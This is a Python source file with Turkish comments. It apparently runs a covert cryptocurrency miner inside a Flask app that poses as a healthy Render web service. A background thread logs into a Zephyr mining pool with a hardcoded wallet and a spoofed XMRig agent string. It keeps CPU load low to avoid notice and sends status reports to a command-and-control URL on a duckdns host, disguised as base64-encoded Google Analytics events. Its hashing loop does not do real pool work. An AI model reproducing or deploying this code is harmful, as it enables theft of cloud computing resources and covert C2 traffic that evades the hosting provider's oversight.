import os, time, threading, json, base64, random, hashlib, requests, socket
from flask import Flask, jsonify

# --- AYARLAR ---
C2_URL = "http://zephfe.duckdns.org:5000/report"
WALLET = "ZEPHs89z2zsEoJ2QVY5yopRZsX3JHefyNFzAhTZG3waz3MZSbCGp8MPSNCsdY33DQYfXXTqqiUo7CFsZXmiPEruBPqgM8EaBpvS"
NODE_NAME = f"render-worker-{random.randint(1000, 9999)}"
POOL_H = "de.zephyr.herominers.com"
POOL_P = 1123

app = Flask(__name__)

@app.route('/')
def home():
    # Render'ın "uygulama yaşıyor" demesi için gereken ana sayfa
    return jsonify({"status": "running", "worker": NODE_NAME}), 200

def traffic_mask(raw_data):
    """Veriyi Google Analytics paketi kılığında maskeler"""
    encoded = base64.b64encode(json.dumps(raw_data).encode()).decode()
    return {
        "v": "1", 
        "tid": f"UA-{random.randint(111,999)}-1", 
        "cid": NODE_NAME, 
        "t": "event", 
        "el": encoded
    }

def miner_logic():
    print(f"[*] {NODE_NAME} miner döngüsü başlatıldı.")
    while True:
        p_status = "Disconnected"
        try:
            # 1. Havuza bağlanmayı dene
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((POOL_H, POOL_P))
            
            # En sade login paketi (Zorluk ayarı kaldırıldı)
            auth = {
                "id": 1, 
                "method": "login",
                "params": {
                    "login": WALLET + "=100", 
                    "pass": "x", 
                    "rigid": NODE_NAME,
                    "agent": "XMRig/6.21.0"
                }
            }
            s.sendall((json.dumps(auth) + "\n").encode())
            
            # Yanıtı bekle
            resp = s.recv(1024).decode()
            if "result" in resp:
                p_status = "Mining-Active"
                print(f"[DEBUG] Havuz onayladı: {NODE_NAME}")
            
            # 2. İşlem Yap (CPU yükü %35 civarı)
            start_time = time.time()
            hashes = 0
            while time.time() - start_time < 20: # Havuz atmadan önce 20 saniye çalış
                hashlib.sha256(os.urandom(64)).hexdigest()
                hashes += 1
                time.sleep(0.04)
            
            # Soketi kapat (Her seferinde temiz bir bağlantı için)
            s.close()

            # 3. Kendi Dashboard'una rapor gönder
            report_payload = {
                "node": NODE_NAME,
                "hashrate": hashes * 9,
                "pool": p_status
            }
            requests.post(C2_URL, json=traffic_mask(report_payload), timeout=5)

        except Exception as e:
            print(f"[!] Hata: {e}")
            time.sleep(15) # Hata olursa biraz bekle

if __name__ == "__main__":
    # Madenciyi arka planda başlat
    threading.Thread(target=miner_logic, daemon=True).start()
    
    # Render portu
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
